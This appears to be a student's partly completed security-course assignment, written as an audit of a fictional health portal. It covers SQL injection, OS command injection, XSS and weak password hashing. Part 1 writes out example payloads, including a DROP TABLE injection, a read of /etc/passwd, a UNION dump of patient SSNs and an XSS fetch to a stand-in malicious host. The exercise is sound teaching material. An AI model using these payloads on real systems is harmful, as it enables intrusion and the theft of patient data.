# FroggyHealthPortal Security Audit
**Consultant: Eric Norman**
**Date: 04/30/2026**

---

## Part 1: Injection Vulnerability Analysis (50 points)

### Code Snippet 1: Patient Search (10 points)

**1. What type of injection vulnerability exists here?**

String based SQL Injection. Someone can inject something malicious in the query.

**2. Example attack payload:**

```
' OR '1'='1
'; DROP TABLE patients; --
```

**3. What damage could an attacker do with this vulnerability?**

Database read/write/delete access. Steal patient records, change patient records, delete patient records.

---

### Code Snippet 2: Medical Report Generator (10 points)

**1. What type of injection vulnerability exists here?**

An OS Command Injection. Someone can inject something malicious in the cmd. 

**2. Example attack payload:**

```
/report/123; whoami
/report/123 && cat /etc/passwd
```

**3. What could an attacker do with this vulnerability?**

Remote Code Execution. Read/write/delete any file. Attack the internal server.

**4. Why are shell commands with user input dangerous?**

Becasue the command accepts ";" "&&" "|" as seperators and the user can input whatever they want which allows for RCE.

---

### Code Snippet 3: Patient Notes Display (10 points)

**Vulnerability 1:**

- **Type of injection:**

  SQL Injection

- **Attack payload:**

  ```
  /notes/1 UNION SELECT password FROM users--
  ```

- **Impact:**

  This payload pulls all passwords, but other patient information can be pulled aswell. Data can also be destroyed or manipulated. 

**Vulnerability 2:**

- **Type of injection:**

  Cross Site Scripting (XSS)

- **Attack payload:**

  ```
  <script>
    fetch('maliciouswebsite.com/stealinfo')
  </script>
  ```

- **Impact:**

  Malicious code executes in users browser including session hijacking, keylogging, phishing.

---

### Code Snippet 4: Prescription Lookup (10 points)

**1. Identify both SQL injection vulnerabilities:**

WHERE p.patient_id = {patient_id} - Integer expected, but anything can be accepted

AND m.name = '{medication}' - Can be broken by adding a quote ' 

**2. `patient_id` parameter:**

- **Why is it vulnerable even without quotes?**

  Python never validates the type without quotes allowing the user to immediately inject malicious code. The user would have to use a closing quote ' otherwise.

- **Attack payload:**

  ```
  OR 1=1--
  ```

**3. `medication` parameter:**

- **UNION injection to dump all patient data:**

  ```
  ' UNION SELECT ssn, name, dob, address, phone, null, null FROM patients--
  ```

- **How does this attack work?**

  The single quote breaks the input out of the string and nullinfies the original query. UNION SELECT gets patient date, -- discrards everything after injection.

---

### Code Snippet 5: Appointment Email Notifications (10 points)

**1. What injection vulnerability exists here?**

OS Command Injection with two points of entry at "cmd = f'/usr/bin/mail -s "{subject}" {email}'"

**2. Attack payload that executes arbitrary commands:**

```
victim@email.com; whoami
```

**3. Step-by-step explanation of how the attack works:**

Step 1: Attacker provides payload
Step 2: Python interprets the string and builds the command with no validation
Step 3: "shell=True" activates the shell interpreter which parses the string for seperate commands (; && |)
Step 4: Each seperate command executes sequentially

**4. When should `shell=True` be used in Python subprocess?**

Only for fully hard coded commands that need shell specific features. NEVER for user input.

---

## Part 2: Cryptography Mistakes (30 points)

### Code Snippet 6: Password Storage (15 points)

**Cryptography Mistake 1:**

- **What's wrong?**

  MD5 is the wrong hash function for passwords. It is built for speed, and doesn't have the security a password would need. Two different inputs can produce the same hash. The same password always produces the same hash.

- **What attack does this enable?**

  Brute force attack. Attackers can get hashes for common passwords and brute force until they get the right one.

- **How would you fix it?**

  Use a more secure password hasher like bcrypt.

**Cryptography Mistake 2:**

- **What's wrong?**

  No salting. No random value added to each password before hashing. Without it it's easy to reverse engineer the password.

- **What attack does this enable?**

  If an attacker sees multiple users with the same hash, they can infer that they all have the same password. Also, same as before, attackers can more easily brute force a password.

- **How would you fix it?**

  Add a salting function. Or just use bcrypt since it does that automatically.

**Does `check_password` have an exploitable timing attack vulnerability?**

Potentially. In "if password_hash == stored_hash:" Python's == operator does byte by byte comparison that can have timing differences. That means different inputs can take longer or shorter to respond. In some circumstances someone might be able to brute force a password locally.

---

### Code Snippet 7: Session Token Generation (15 points)

**1. What cryptography mistake makes this token generation insecure?**

> _Your answer here._

**2. How could an attacker predict these session tokens?**

> _Your answer here._

**3. How long should session tokens be, and why?**

> _Your answer here._

**4. What's the difference between the `random` and `secrets` modules in Python?**

> _Your answer here._

---

## Part 3: Risk Assessment (20 points)

### Vulnerability Rankings

| Rank | Snippet # | Vulnerability Name | Severity |
|------|-----------|-------------------|----------|
| 0 | | | |
| 1 | | | |
| 2 | | | |
| 3 | | | |
| 4 | | | |
| 5 | | | |
| 6 | | | |

### Which single vulnerability would you fix first?

> _Your answer here (~paragraph)._

### Which vulnerability would take the longest to fix?

> _Your answer here (~paragraph)._

### How much do you plan to charge for your security review?

> _Your answer here (~sentences)._

### Do you plan to sign up for FroggyHealthPortal?

> _Your answer here (~sentences)._
